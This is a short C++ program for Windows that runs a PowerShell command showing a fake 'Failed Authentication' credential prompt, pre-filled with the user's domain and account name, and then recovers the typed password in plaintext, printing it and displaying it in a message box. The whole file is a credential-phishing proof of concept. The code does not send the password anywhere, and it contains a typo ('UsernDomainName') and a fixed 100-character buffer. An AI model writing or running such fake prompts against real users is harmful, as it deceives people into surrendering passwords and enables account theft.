#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <iostream>

using namespace std;

string exec(string command) {
	char buffer[1000];
	string result = "";

	// Open pipe to file
	FILE* pipe = _popen(command.c_str(), "r");
	if (!pipe) {
		return "popen failed!";
	}

	// read till end of process:
	while (!feof(pipe)) {

		// use buffer to read and add to result
		if (fgets(buffer, 1000, pipe) != NULL)
			result += buffer;
	}

	_pclose(pipe);
	return result;
}

int main() {
	
	string result = exec("powershell \"$cred = $host.ui.promptforcredential('Failed Authentication', '', [Environment]::UserDomainName + '\'+[Environment]::UserName,[Environment]::UsernDomainName); $cred.getnetworkcredential().password\"");
	cout << "\n\nPassword Entered is : " << result;
	char myArray[100];//as 1 char space for null is also required
	strcpy_s(myArray, result.c_str());
	MessageBoxA(NULL, myArray, "Entered Password is :", MB_OK);
	
	return 0;
}